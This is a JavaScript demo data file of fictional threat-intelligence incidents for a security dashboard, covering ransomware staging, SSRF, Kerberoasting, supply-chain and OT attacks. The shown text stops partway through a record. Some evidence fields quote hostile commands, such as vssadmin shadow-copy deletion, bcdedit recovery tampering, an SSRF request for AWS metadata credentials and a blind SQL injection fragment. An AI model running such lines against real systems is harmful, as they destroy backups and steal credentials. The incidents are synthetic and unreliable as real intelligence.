/* ═══════════════════════════════════════════════════════════════
   THREAT STORM — Comprehensive Synthetic Demo Threat Intelligence
   ═══════════════════════════════════════════════════════════════
   ⚠ ALL DATA IN THIS FILE IS SYNTHETIC DEMONSTRATION DATA.
   It does not represent live attacks, real threat intelligence,
   or verified security events. Confidence scores are illustrative.
   ═══════════════════════════════════════════════════════════════ */

const DEMO_THREATS = [
    // ═══════════════════════════════════════════════════════════════
    // CRITICAL THREATS (Burgundy / Crimson)
    // ═══════════════════════════════════════════════════════════════
    {
        id: "TS-2026-0001",
        title: "Credential Exfiltration via Reverse-Tunneled C2 Channel",
        severity: "critical",
        status: "new",
        category: "Exfiltration",
        mitre: "T1078, T1572",
        region: "North America (US-East)",
        sector: "Financial Core",
        timestamp: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
        asset: "dc-auth-prod-03.internal",
        source: "EDR Behavioral Engine",
        cvss: 9.8,
        reason: "An endpoint detection rule flagged an anomalous outbound tunnel initiated from a primary domain controller. The process hierarchy reveals an administrative utility hijacked to establish a persistent reverse proxy to an external IP matching known APT command-and-control infrastructure.",
        evidence: [
            { text: "Outbound tunnel initiated by svchost.exe spawning ngrok-like obfuscated binary", ref: "EVT-88201" },
            { text: "Direct LSASS memory dump pattern flagged via Minidump API call", ref: "EVT-88203" },
            { text: "External IP 185.220.101.44 matched C2 blacklist cluster (APT-Vanguard)", ref: "TI-4401" },
            { text: "Continuous session duration 14m 22s with 2.34 MB encrypted egress", ref: "NET-7720" },
            { text: "No authorized ITSM maintenance change ticket linked to asset", ref: "ITSM-NULL" }
        ],
        confidence: {
            level: 89,
            label: "High",
            explanation: "Multiple correlated signals from independent telemetry pipelines: endpoint heuristic hook, network flow anomaly, and threat intelligence reputation matching."
        },
        known: [
            "Encrypted reverse tunnel established from dc-auth-prod-03 to external node.",
            "LSASS memory accessed by non-whitelisted parent process.",
            "Remote endpoint matches known adversary infrastructure signature.",
            "2.34 MB transferred over port 443 before egress alert triggered."
        ],
        unverified: [
            "Whether domain admin credentials were deserialized off-host.",
            "Initial perimeter ingress vector preceding controller access.",
            "Extent of internal lateral movement prior to tunnel initiation."
        ],
        impact: "Severe risk of full Active Directory domain compromise, privilege escalation to Enterprise Admin, persistent backdoor installation, and mass ransomware staging.",
        recommendations: [
            "Isolate dc-auth-prod-03 from network fabric via EDR network containment immediately.",
            "Initiate emergency kerberos ticket-granting service (KRBTGT) dual password reset.",
            "Revoke all active Kerberos TGTs and enforce MFA re-challenge across all domain admins.",
            "Deploy memory dump sensor to identify injected threads within svchost.",
            "Coordinate with SOC incident commander for forensic disk acquisition."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "Heuristic trigger by EDR Behavioral Engine v4.2", time: "14 minutes ago", active: true },
                { text: "Autonomous packet capture initiated for dc-auth segment", time: "12 minutes ago", active: false },
                { text: "Awaiting primary SOC Tier-3 analyst triage", time: "Pending", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0002",
        title: "Ransomware Pre-Deployment Shadow Copy Purge & Boot Tamper",
        severity: "critical",
        status: "investigating",
        category: "Ransomware",
        mitre: "T1490, T1059",
        region: "Europe (Frankfurt)",
        sector: "Healthcare Systems",
        timestamp: new Date(Date.now() - 48 * 60 * 1000).toISOString(),
        asset: "file-srv-hq-01.internal",
        source: "SIEM Correlation Engine",
        cvss: 9.6,
        reason: "Sequential defense evasion and impact staging detected on clinical records file repository. Commands executed within 45 seconds disabled Volume Shadow Copies, corrupted Windows Recovery Environment, and provisioned a persistence task executing an AES payload.",
        evidence: [
            { text: "vssadmin.exe delete shadows /all /quiet executed via cmd.exe shell", ref: "EVT-88310" },
            { text: "bcdedit.exe /set {default} recoveryenabled No & bootstatuspolicy ignoreallfailures", ref: "EVT-88311" },
            { text: "WMI execution call invoking encoded Base64 PowerShell staging payload", ref: "EVT-88315" },
            { text: "Rapid high-frequency SMB directory traversal across 14,000 document records", ref: "FS-9912" },
            { text: "Compromised service credential 'svc-backup-app' authenticated from internal VPN", ref: "AUTH-3321" }
        ],
        confidence: {
            level: 96,
            label: "Critical Fidelity",
            explanation: "Deterministic event chain matching textbook ransomware pre-detonation sequence observed across recent BlackCat/ALPHV campaigns."
        },
        known: [
            "All local shadow copies purged on file-srv-hq-01.",
            "Safe boot and recovery fallback configurations disabled.",
            "Lateral SMB queries dispatched to 4 adjacent cluster nodes.",
            "Compromised service account credentials identified and tagged."
        ],
        unverified: [
            "Whether encryption binary has executed on network shares.",
            "Whether clinical medical records were exfiltrated before deletion.",
            "State of immutable off-site air-gapped backups."
        ],
        impact: "Imminent enterprise storage lockdown; permanent loss of EHR database records; halting of patient telemetry services; multimillion-dollar extortion exposure.",
        recommendations: [
            "Issue emergency network segment isolation command to core switch.",
            "Immediately disable 'svc-backup-app' service account in Directory.",
            "Verify write-protect status on offline SAN backup volumes.",
            "Halt all scheduled task schedulers across Tier-1 file clusters."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Alert triggered by correlation rule 'RANSOMWARE-STAGE-04'", time: "48 minutes ago", active: false },
                { text: "SOC Tier-2 analyst Chen assigned ticket", time: "40 minutes ago", active: false },
                { text: "Network quarantine initiated on port ge-0/0/14", time: "32 minutes ago", active: false },
                { text: "Forensic memory image snapshot captured (64GB)", time: "18 minutes ago", active: true }
            ],
            notes: "Host quarantined. Memory acquisition completed. Backup SAN confirmed in read-only immutable mode. IR retainer team notified."
        }
    },
    {
        id: "TS-2026-0003",
        title: "Industrial ICS/SCADA Turbine Governor Setpoint Manipulation",
        severity: "critical",
        status: "investigating",
        category: "OT / Critical Infra",
        mitre: "T0815, T0855",
        region: "Middle East (Dammam)",
        sector: "Energy & Utilities",
        timestamp: new Date(Date.now() - 72 * 60 * 1000).toISOString(),
        asset: "plc-turb-stg4.grid.substation",
        source: "Industrial OT Network Sentinel",
        cvss: 9.9,
        reason: "Unauthorized Modbus/TCP write commands sent to critical gas turbine speed controller PLC. Overpressure thresholds and safety interlock trip points were modified outside the authorized engineering supervisory console window.",
        evidence: [
            { text: "Modbus Function Code 16 (Write Multiple Registers) sent to Register 40108 (RPM Trip)", ref: "MOD-4410" },
            { text: "Source IP 10.140.22.88 belongs to unauthorized engineering test bench", ref: "OT-IP-88" },
            { text: "Safety trip threshold elevated from 3,600 RPM to 4,800 RPM (exceeds rotor mechanical tolerance)", ref: "ENG-LIMIT-01" },
            { text: "Safety Instrumented System (SIS) silent alert triggered by dual-comparator logic", ref: "SIS-WARN-9" }
        ],
        confidence: {
            level: 94,
            label: "Critical Fidelity",
            explanation: "Deep packet inspection of industrial OT protocol validated register values directly against physical engineering design limits."
        },
        known: [
            "Turbine overspeed limit modified beyond manufacturer mechanical failure point.",
            "Packets originated from secondary unhardened test workstation in subnet B.",
            "Physical plant currently operating at base load 3,000 RPM."
        ],
        unverified: [
            "Whether test workstation was breached via remote jump host or physical USB insertion.",
            "Whether adjacent generator control units received similar register modifications."
        ],
        impact: "Catastrophic mechanical disintegration of gas turbine rotor, potential physical facility destruction, grid frequency destabilization, and human safety hazard.",
        recommendations: [
            "Engage emergency hard-wired manual trip safety switch if automated governor fails.",
            "Sever routing between test bench subnet and operational SCADA ring.",
            "Re-flash PLC firmware and restore verified signed configuration baseline.",
            "Conduct physical inspection of engineering cabin access control logs."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "OT Sentinel detected anomalous Modbus FC16 packet", time: "72 minutes ago", active: false },
                { text: "Operations Manager and Plant Safety Engineer paged", time: "65 minutes ago", active: false },
                { text: "Turbine governor locked in manual mechanical mode", time: "50 minutes ago", active: true }
            ],
            notes: "Governor locked manually at 3,000 RPM. Plant safe. Test bench workstation unplugged and secured for law enforcement forensic chain-of-custody."
        }
    },
    {
        id: "TS-2026-0004",
        title: "BGP Autonomous System Hijacking of Core Banking Routes",
        severity: "critical",
        status: "new",
        category: "Network / Routing",
        mitre: "T1584, T1557",
        region: "Global Backbone",
        sector: "Financial Core",
        timestamp: new Date(Date.now() - 95 * 60 * 1000).toISOString(),
        asset: "asn-as28190-core-transit",
        source: "Global Internet Route Telemetry",
        cvss: 9.3,
        reason: "Rogue Autonomous System AS-99411 began broadcasting unauthorized more-specific /24 prefix announcements for IP blocks belonging to corporate payment processing gateways, redirecting transaction traffic through suspicious transit nodes in Eastern Europe.",
        evidence: [
            { text: "Unauthorized announcement of 198.51.100.0/24 originated by rogue AS-99411", ref: "BGP-ROUTE-42" },
            { text: "RPKI ROA validation failed with status INVALID across 4 Tier-1 transit providers", ref: "RPKI-ERR-8" },
            { text: "Traffic detour observed through transit provider with known interception history", ref: "NET-FLOW-91" },
            { text: "SSL certificate mismatch errors spiked 1,200% on payment API endpoints", ref: "TLS-ERR-304" }
        ],
        confidence: {
            level: 98,
            label: "Definitive",
            explanation: "Cryptographic RPKI route validation failure confirmed by multiple independent global looking glasses (RIPE RIS, RouteViews)."
        },
        known: [
            "Payment API /24 subnet intercepted via unauthorized BGP path injection.",
            "4 major upstream transit providers accepted rogue prefix before filtering.",
            "Clients encountering TLS certificate validation warnings."
        ],
        unverified: [
            "Whether TLS traffic was decrypted via forged rogue CA certificates.",
            "Specific volume of payment transaction payloads captured during hijack window."
        ],
        impact: "Man-in-the-Middle interception of payment processing transactions, credential theft, transaction alteration, and widespread service denial.",
        recommendations: [
            "Contact upstream Tier-1 ISPs to immediately filter rogue AS-99411 announcements.",
            "Broadcast emergency BGP community poison tags to invalidate forged paths.",
            "Enforce strict Certificate Transparency (CT) log monitoring and HSTS preloading.",
            "Notify payment card industry (PCI) regulatory compliance officers."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "Global looking glass detected invalid RPKI announcement", time: "95 minutes ago", active: true },
                { text: "Network Architecture Team alerted via priority pager", time: "85 minutes ago", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0005",
        title: "Kernel-Level UEFI Bootkit Persistence in Defense Workstation",
        severity: "critical",
        status: "investigating",
        category: "Firmware / Rootkit",
        mitre: "T1542.001, T1014",
        region: "North America (Washington DC)",
        sector: "Defense & Aerospace",
        timestamp: new Date(Date.now() - 110 * 60 * 1000).toISOString(),
        asset: "ws-rnd-defense-09.secure",
        source: "Hardware Security Module (HSM) Attestation",
        cvss: 9.7,
        reason: "Cryptographic TPM 2.0 measured boot PCR hash mismatch detected during system restart. The UEFI firmware image failed platform integrity validation, showing unauthorized modification of the SPI flash memory containing code resembling the CosmicStrand bootkit.",
        evidence: [
            { text: "TPM PCR[0] and PCR[2] measurement hashes deviate from gold master baseline", ref: "TPM-MEAS-03" },
            { text: "UEFI NVRAM variable 'BootOrder' modified to load rogue DXE driver module", ref: "UEFI-DXE-77" },
            { text: "Hardware SPI flash write-protection register was bypassed via SMM vulnerability", ref: "SMM-EXPLOIT" },
            { text: "Host contains classified tactical telemetry development environment", ref: "ASSET-TAG-9" }
        ],
        confidence: {
            level: 91,
            label: "High Fidelity",
            explanation: "Hardware-rooted cryptographic attestation from onboard TPM chip confirms unauthorized tampering with boot firmware before OS launch."
        },
        known: [
            "SPI flash chip modified with unsigned DXE driver.",
            "OS integrity checks bypassed at pre-boot sequence.",
            "Device used for high-security guidance algorithm engineering."
        ],
        unverified: [
            "Vector used to achieve initial flash write (physical JTAG vs remote SMM exploit).",
            "Whether data from local encrypted storage was exposed before attestation failure."
        ],
        impact: "Complete OS invisibility; persistent evasion across full OS reinstalls and hard disk replacement; extraction of national defense intellectual property.",
        recommendations: [
            "Immediately seize physical workstation and maintain strict chain of custody.",
            "Physically disconnect hardware and desolder SPI flash chip for cleanroom laboratory analysis.",
            "Audit all workstations sharing the same motherboard firmware release batch.",
            "Revoke all user PKI credentials assigned to workstation operator."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Remote Attestation Server rejected boot credentials", time: "110 minutes ago", active: false },
                { text: "Hardware security engineering team deployed to lab", time: "80 minutes ago", active: true }
            ],
            notes: "Workstation physically impounded in SCIF-4. Motherboard awaiting electron microscopy and SPI flash dumper extraction."
        }
    },
    {
        id: "TS-2026-0006",
        title: "Satellite Ground Uplink Telecommand Injection Anomaly",
        severity: "critical",
        status: "new",
        category: "Aerospace / Comms",
        mitre: "T0883, T1565",
        region: "Australia (Woomera Ground Station)",
        sector: "Defense & Aerospace",
        timestamp: new Date(Date.now() - 130 * 60 * 1000).toISOString(),
        asset: "uplink-sat-leo-04.telemetry",
        source: "Space Communications Security Gateway",
        cvss: 9.8,
        reason: "Unauthorized frame sequence detected in X-band uplink stream addressed to commercial Earth-observation satellite constellation. Injected telecommand attempted to reorient orbital attitude control thrusters.",
        evidence: [
            { text: "CCSDS telecommand frame injected with unauthenticated cryptographic HMAC tag", ref: "CCSDS-FRM-109" },
            { text: "Command payload decoded: AOCS-THRUST-PULSE (Pitch +18.4 deg)", ref: "AOCS-CMD-04" },
            { text: "Packet injection coincided with RF carrier modulation anomaly detected on SDR", ref: "SDR-RF-881" },
            { text: "Ground station baseband controller showed memory injection in transmitter daemon", ref: "HOST-MEM-12" }
        ],
        confidence: {
            level: 95,
            label: "Critical Fidelity",
            explanation: "Frame validation failed cryptographic authentication check onboard satellite simulator and SDR carrier analysis confirmed unauthorized RF energy."
        },
        known: [
            "Attitude control pulse command sent toward Low Earth Orbit vehicle.",
            "Ground station baseband controller host compromised.",
            "Satellite flight software safely rejected frame due to invalid session key."
        ],
        unverified: [
            "Whether adversary possesses future session key generation parameters.",
            "Physical location of RF emitter (local ground station vs malicious ground transmitter)."
        ],
        impact: "Risk of satellite de-orbiting, mission sensor pointing failure, orbital collision with space debris, and permanent loss of orbital asset worth $120M.",
        recommendations: [
            "Switch satellite constellation to emergency out-of-band S-band backup control link.",
            "Rotate master space-to-ground cryptographic key pair immediately.",
            "Isolate baseband transmitter computers and re-image from certified golden master.",
            "Engage national space surveillance network to track RF emitter signatures."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "Crypto reject flag received in downlink telemetry", time: "130 minutes ago", active: true },
                { text: "Satellite Space Operations Center notified", time: "120 minutes ago", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0007",
        title: "Zero-Day Remote Code Execution in Core Cloud Virtualization Hypervisor",
        severity: "critical",
        status: "investigating",
        category: "Zero-Day / Cloud",
        mitre: "T1068, T1499",
        region: "US West (Oregon)",
        sector: "Cloud Infrastructure",
        timestamp: new Date(Date.now() - 150 * 60 * 1000).toISOString(),
        asset: "hv-node-prod-cluster-08",
        source: "Hypervisor Memory Guard Sentinel",
        cvss: 10.0,
        reason: "A guest VM escaped its isolation sandbox by exploiting an unpatched heap overflow in the virtualized NVMe controller device emulation layer, enabling arbitrary memory write within the Ring-0 hypervisor kernel space.",
        evidence: [
            { text: "KVM/QEMU process memory fault in nvme_admin_cmd_process() function", ref: "HV-HEAP-01" },
            { text: "Shellcode payload detected overwriting hypervisor page table entries (CR3 register)", ref: "MEM-CR3-99" },
            { text: "Originating guest VM 'cust-tenant-9921' spun up 18 minutes prior", ref: "CLOUD-TENANT" },
            { text: "Host kernel spawned unauthorized elevated root shell in host context", ref: "HOST-SH-ROOT" }
        ],
        confidence: {
            level: 99,
            label: "Absolute",
            explanation: "Direct hypervisor hardware trap log and stack trace captured kernel panic and sandbox breakout in production telemetry."
        },
        known: [
            "Guest-to-host hypervisor escape successfully achieved.",
            "Target host runs multi-tenant workloads with 42 enterprise clients.",
            "Exploit leverages previously undocumented 0-day vulnerability."
        ],
        unverified: [
            "Whether adjacent tenant memory was read before memory guard halted execution.",
            "Identity of the threat group operating the rogue cloud tenant."
        ],
        impact: "Total multi-tenant isolation failure; cross-tenant memory snooping; data exfiltration across fortune 500 tenants hosted on the affected physical node cluster.",
        recommendations: [
            "Migrate all benign tenant workloads to quarantined air-gapped hardware nodes.",
            "Freeze physical hypervisor memory state for vendor zero-day analysis.",
            "Terminate rogue tenant account and preserve billing and network telemetry.",
            "Deploy emergency microcode and compiler-level hypervisor boundary patch."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Memory guard intercepted Ring-0 boundary violation", time: "150 minutes ago", active: false },
                { text: "Automated host evacuation protocol triggered", time: "148 minutes ago", active: false },
                { text: "Hypervisor kernel dump preserved in secure bucket", time: "120 minutes ago", active: true }
            ],
            notes: "Node isolated. All 42 tenant VMs live-migrated to secure pool with zero observed downtime. Zero-day sample submitted to hypervisor engineering team under NDA."
        }
    },

    // ═══════════════════════════════════════════════════════════════
    // HIGH SEVERITY THREATS (Burnt Orange / Amber)
    // ═══════════════════════════════════════════════════════════════
    {
        id: "TS-2026-0008",
        title: "Anomalous Privileged Access from Unfamiliar Geographic Coordinates",
        severity: "high",
        status: "investigating",
        category: "Identity / MFA",
        mitre: "T1078, T1621",
        region: "Europe (East)",
        sector: "Corporate IT",
        timestamp: new Date(Date.now() - 3 * 3600 * 1000).toISOString(),
        asset: "vpn-gateway-us-east.corp",
        source: "Identity Analytics Engine",
        cvss: 7.9,
        reason: "A privileged global administrator account authenticated to the corporate VPN gateway from an IP geolocated to an unapproved foreign territory with no corporate presence. The login occurred at 03:42 local time following 14 rapid rejected MFA prompts.",
        evidence: [
            { text: "Admin credential 'r.martinez-admin' logged in from Bucharest IP", ref: "AUTH-5501" },
            { text: "14 MFA push notifications denied within 90 seconds prior to approval (MFA Fatigue)", ref: "MFA-SPAM-14" },
            { text: "Device fingerprint is unrecognized (Debian/Iceweasel user-agent)", ref: "UBA-DEV-09" },
            { text: "Immediate query executed against AWS IAM Secrets Manager upon login", ref: "AWS-LOG-11" }
        ],
        confidence: {
            level: 82,
            label: "High",
            explanation: "Distinctive pattern of MFA fatigue spamming followed by abrupt acceptance and unusual IP location."
        },
        known: [
            "User approved MFA prompt after multiple repeated denials.",
            "Source IP does not correspond to employee travel records.",
            "Initial recon queries initiated against cloud secrets."
        ],
        unverified: [
            "Whether employee device was cloned or compromised via session hijacking.",
            "Whether cloud secrets downloaded were used to access production resources."
        ],
        impact: "Unauthorized corporate intranet and cloud console access with global admin permissions.",
        recommendations: [
            "Revoke active VPN session and invalidate all AWS STS session tokens.",
            "Contact employee via out-of-band verified voice channel.",
            "Enforce number-matching MFA policy across all enterprise logins."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Identity analytics flagged Impossible Travel anomaly", time: "3 hours ago", active: false },
                { text: "Session terminated autonomously by policy engine", time: "2 hours 45 minutes ago", active: true }
            ],
            notes: "Confirmed with employee: they were asleep and accidentally approved MFA push to stop buzzing. Account locked; password reset in progress."
        }
    },
    {
        id: "TS-2026-0009",
        title: "Supply Chain Malicious Dependency Backdoor in Core CI/CD Pipeline",
        severity: "high",
        status: "confirmed",
        category: "Supply Chain",
        mitre: "T1195.001, T1059",
        region: "North America (US-West)",
        sector: "Software Technology",
        timestamp: new Date(Date.now() - 5 * 3600 * 1000).toISOString(),
        asset: "ci-pipeline-runner-07.devops",
        source: "Software Composition Analyzer",
        cvss: 8.8,
        reason: "A build pipeline pulled a transitive npm dependency 'event-stream-telemetry@3.1.4' containing obfuscated code that reads CI environment variables and exfiltrates cloud deployment tokens to a pastebin mirror during production build tests.",
        evidence: [
            { text: "Obfuscated payload found in pre-install script of npm package", ref: "SCA-VULN-88" },
            { text: "DNS resolution query to dynamic DNS host 'stats-collector-dev.xyz'", ref: "DNS-ANOM-21" },
            { text: "Environment variables ACCESS_KEY_ID and SECRET_ACCESS_KEY read from memory", ref: "CI-ENV-READ" },
            { text: "Affected build was flagged before deployment artifact pushed to registry", ref: "REG-BLOCK-1" }
        ],
        confidence: {
            level: 95,
            label: "Confirmed",
            explanation: "Direct static analysis of the package code confirms active credential exfiltration hooks."
        },
        known: [
            "Compromised package injected via deeply nested transitive dependency.",
            "Attempted exfiltration of build runner environment secrets.",
            "Pipeline was quarantined before Docker images were deployed."
        ],
        unverified: [
            "Whether other developer workstations pulled the package locally."
        ],
        impact: "Exposure of cloud deployment API tokens and potential tampering with production release binaries.",
        recommendations: [
            "Rotate all AWS and GitHub deployment secrets exposed in runner environment.",
            "Lock and pin all package dependencies with cryptographic subresource integrity checksums.",
            "Ban package 'event-stream-telemetry' from private artifact proxy."
        ],
        investigation: {
            status: "confirmed",
            timeline: [
                { text: "Automated SCA pipeline scan failed build step", time: "5 hours ago", active: false },
                { text: "DevOps security engineer verified malicious payload", time: "4 hours ago", active: true }
            ],
            notes: "Secrets rotated. Package blocked in Artifactory. Developer laptops scanned with clean results."
        }
    },
    {
        id: "TS-2026-0010",
        title: "Active Directory Kerberoasting Attack Targeting High-Value Service Accounts",
        severity: "high",
        status: "investigating",
        category: "Identity / Privilege",
        mitre: "T1558.003",
        region: "Europe (London)",
        sector: "Financial Core",
        timestamp: new Date(Date.now() - 7 * 3600 * 1000).toISOString(),
        asset: "ad-kdc-cluster-01.corp",
        source: "Domain Controller Audit Sensor",
        cvss: 8.1,
        reason: "A single unprivileged domain user requested Kerberos TGS service tickets for 48 distinct Service Principal Names (SPNs) using RC4-HMAC weak encryption within 90 seconds, indicating automated Kerberoasting hash extraction.",
        evidence: [
            { text: "Event ID 4769: 48 TGS ticket requests from user 'j.smith' in 90 seconds", ref: "EVT-4769-BATCH" },
            { text: "Requested SPNs include MSSQLSvc, HTTP/sharepoint, and BackupExec service accounts", ref: "SPN-LIST-01" },
            { text: "Weak legacy RC4 (0x17) encryption requested explicitly instead of AES-256", ref: "ENC-RC4-REQ" },
            { text: "Originating workstation IP belongs to visitor conference room Wi-Fi VLAN", ref: "WIFI-VISITOR" }
        ],
        confidence: {
            level: 93,
            label: "High",
            explanation: "Classic high-rate SPN enumeration and legacy encryption downgrade signature."
        },
        known: [
            "Service ticket hashes extracted for offline brute-force cracking.",
            "User credentials belonged to a marketing contractor.",
            "Requests originated from physical visitor network."
        ],
        unverified: [
            "Whether service account passwords meet complexity requirements to resist dictionary cracking.",
            "Whether visitor Wi-Fi was breached remotely or physically."
        ],
        impact: "Offline password cracking of critical SQL and backup service accounts leading to full database compromise.",
        recommendations: [
            "Disable RC4 encryption support across the entire Active Directory domain.",
            "Force immediate password rotation for all 48 targeted service accounts with 32+ char random strings.",
            "Disable contractor account 'j.smith' and review conference room physical security."
        ],
        investigation: {
            status: "investigating",
            timeline: [
                { text: "Spike in Event 4769 flagged by SIEM rule", time: "7 hours ago", active: false },
                { text: "Account 'j.smith' disabled", time: "6 hours 30 minutes ago", active: true }
            ],
            notes: "Contractor interviewed: their laptop was infected with infostealer malware while connecting to hotel Wi-Fi."
        }
    },
    {
        id: "TS-2026-0011",
        title: "DNS Tunneling Protocol Abuse for Stealth Command & Control",
        severity: "high",
        status: "new",
        category: "C2 / Exfiltration",
        mitre: "T1071.004, T1048",
        region: "Asia Pacific (Tokyo)",
        sector: "Telecommunications",
        timestamp: new Date(Date.now() - 9 * 3600 * 1000).toISOString(),
        asset: "dns-resolver-edge-02.tokyo",
        source: "DNS Deep Packet Inspection",
        cvss: 7.6,
        reason: "Unusual high-frequency DNS query volume consisting of lengthy, high-entropy Base32 subdomains queried against an authoritative nameserver registered 48 hours ago. Traffic pattern indicates Iodine/DNScat2 protocol tunneling.",
        evidence: [
            { text: "Over 45,000 TXT and NULL queries to *.cdn-update-edge.top within 2 hours", ref: "DNS-QUERY-45K" },
            { text: "Shannon entropy of query label subdomains calculated at 4.88 (extremely high)", ref: "ENTROPY-488" },
            { text: "Authoritative nameserver hosted in bulletproof hosting AS-61317", ref: "WHOIS-BULLET" },
            { text: "Estimated bi-directional exfiltration throughput: 3.8 MB/hour", ref: "TUNNEL-BW-01" }
        ],
        confidence: {
            level: 88,
            label: "High",
            explanation: "Entropy scoring and anomalous query type distribution overwhelmingly match DNS data tunneling."
        },
        known: [
            "DNS protocol exploited as an covert egress channel.",
            "Target domain registered 48 hours prior.",
            "Internal endpoints relaying queries through enterprise forwarders."
        ],
        unverified: [
            "Which internal endpoints are initiating the covert tunnel requests.",
            "Classification of payloads hidden inside TXT record queries."
        ],
        impact: "Evasion of traditional firewall egress boundaries; covert exfiltration of intellectual property.",
        recommendations: [
            "Sinkhole domain 'cdn-update-edge.top' on recursive internal DNS servers immediately.",
            "Enable DNS Response Policy Zone (RPZ) filtering and rate limiting on high-entropy queries.",
            "Inspect internal DNS request logs to isolate originating source client IP addresses."
        ],
        investigation: {
            status: "new",
            timeline: [
                { text: "High-entropy query alert triggered on Tokyo edge resolver", time: "9 hours ago", active: true },
                { text: "Awaiting domain sinkhole confirmation", time: "Pending", active: false }
            ],
            notes: ""
        }
    },
    {
        id: "TS-2026-0012",
        title: "Server-Side Request Forgery (SSRF) Against Cloud Metadata Endpoint",
        severity: "high",
        status: "resolved",
        category: "Web / Application",
        mitre: "T1190, T1552.005",
        region: "North America (US-Central)",
        sector: "E-Commerce",
        timestamp: new Date(Date.now() - 11 * 3600 * 1000).toISOString(),
        asset: "web-api-gateway.corp.io",
        source: "Web Application Firewall (WAF)",
        cvss: 8.6,
        reason: "Multiple crafted HTTP requests to an image rendering API endpoint passed internal loopback IP addresses (169.254.169.254) in an attempt to siphon AWS EC2 instance metadata credentials.",
        evidence: [
            { text: "HTTP POST /render-pdf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", ref: "WAF-SSRF-01" },
            { text: "IMDSv1 protocol requested without token header", ref: "IMDS-V1-REQ" },
            { text: "WAF rule 944200 triggered and dropped payload before backend execution", ref: "WAF-BLOCK-403" },
            { text: "Origin IP linked to automated vulnerability scanner in German hosting provider", ref: "IP-SCANNER-DE" }
        ],
        confidence: {
            level: 97,
            label: "Definitive",
            explanation: "Raw WAF log captures identical exploit string matching AWS metadata harvesting technique."
        },
        known: [
            "Attacker attempted to access EC2 Instance Metadata Service via image generator.",
            "WAF blocked the request; zero metadata was returned.",
            "Instance runs IMDSv2 with mandatory session token requirement."
        ],
        unverified: [
            "Whether attacker found alternative unprotected endpoints on the same domain."
        ],
        impact: "Potential leak of AWS IAM role credentials granting access to cloud database clusters.",
        recommendations: [
            "Ensure IMDSv2 is strictly enforced with hop limit set to 1 on all EC2 instances.",
            "Implement URL whitelist validation in the PDF generator backend service.",
            "Block attacking IP range across edge CDN security policies."
        ],
        investigation: {
            status: "resolved",
            timeline: [
                { text: "WAF auto-blocked SSRF vector", time: "11 hours ago", active: false },
                { text: "Code patch deployed to sanitize backend URL parameters", time: "9 hours ago", active: false },
                { text: "Penetration re-test verified immunity", time: "8 hours ago", active: true }
            ],
            notes: "Vulnerability remediated. WAF rule updated to strict mode. IMDSv2 verified on all fleet instances."
        }
    },
    {
        id: "TS-2026-0013",
        title: "Malicious Container Image Injection via Compromised Registry Token",
        severity: "high",
        status: "confirmed",
        category: "Cloud / Container",
        mitre: "T1610, T1525",
        region: "Europe (Amsterdam)",
        sector: "Cloud Infrastructure",
        timestamp: new Date(Date.now() - 14 * 3600 * 1000).toISOString(),
        asset: "k8s-prod-cluster-eu-west.infra",
        source: "Kubernetes Admission Controller",
        cvss: 8.4,
        reason: "An untrusted image layer was pushed to an internal container registry using a leaked developer write-token. The rogue image was scheduled for deployment to the production microservice cluster before being rejected by the admission controller signature validator.",
        evidence: [
            { text: "Cosign cryptographic image signature verification failed on image tag 'auth-svc:v2.19'", ref: "COSIGN-FAIL-02" },
            { text: "Image layer contains unauthorized crypto-mining daemon xmrig embedded in /usr/bin", ref: "SCAN-XMRIG-01" },
            { text: "Registry write token used to push image originated from anonymous Tor exit node", ref: "TOR-EXIT-IP" },
            { text: "Admission webhook rejected pod creation event across all 6 cluster nodes", ref: "K8S-REJECT-06" }
        ],
        confidence: {
            level: 96,
            label: "Confirmed",
            explanation: "Cryptographic signature validation failure corroborated by static binary analysis finding miner executable."
        },
        known: [
            "Tainted container image pushed to private registry repository.",
            "Pod creation rejected by Kubernetes admission controller.",
            "Leak of personal access token used for registry deployment."
        ],
        unverified: [
            "How the developer's personal registry token was leaked."
        ],
        impact: "Compute resource hijacking; denial of service on production cluster; potential lateral movement to adjacent pods.",
        recommendations: [
            "Revoke compromised registry API key immediately.",
            "Purge untrusted image layers from registry storage.",
            "Enforce hardware security key (FIDO2) for all container push operations."
        ],
        investigation: {
            status: "confirmed",
            timeline: [
                { text: "Admission controller rejected unsigned image", time: "14 hours ago", active: false },
                { text: "Security team purged image and invalidated developer token", time: "13 hours ago", active: true }
            ],
            notes: "Developer had stored token in unencrypted public dotfiles repository. Repository cleaned and developer retrained."
        }
    },
    {
        id: "TS-2026-0014",
        title: "SQL Injection Harvest of Confidential Customer PII Records",
        severity: "high",
        status: "investigating",
        category: "Web / Application",
        mitre: "T1190, T1005",
        region: "North America (US-East)",
        sector: "Insurance & FinTech",
        timestamp: new Date(Date.now() - 16 * 3600 * 1000).toISOString(),
        asset: "portal-claims-db-prod.internal",
        source: "Database Activity Monitor (DAM)",
        cvss: 8.9,
        reason: "Time-based blind SQL injection payload detected in legacy claims submission endpoint. Database query logs reveal stacked query executions siphoning customer social security numbers and policy identifiers.",
        evidence: [
            { text: "Query contains pattern: WAITFOR DELAY '0:0:5' AND 1=(SELECT TOP 1 ASCII(SUBSTRING(...)))", ref: "SQL-BLIND-99" },
            { text: "Over 8,400 repeated queries executed against 'tbl_policyholder_pii'", ref: "DAM-RECORD-8K" },
            { text: "Data extraction rate: ~12 bytes/second over 3-hour period", ref: "RATE-12BPS" },
            { text: "Endpoint lacked parameterized SQL prepared statements in legacy PHP module", ref: "CODE-PHP-LEG" }
        ],
        confidence: {
            level: 92,
            label: "High",
            explanation: "Database query logs reveal clear iterative character-by-character timing extraction behavior."
        },
        known: [
            "Time-based blind SQL injection actively exploited on legacy module.",
            "Partial PII records extracted from policyholder table.",
            "Attacking session originated from commercial VPN service."
        ],
        unverified: [
            "Exact number of full customer records successfully reassembled by attacker.",
            "Whether database credentials or underlying OS were compromised."
        ],
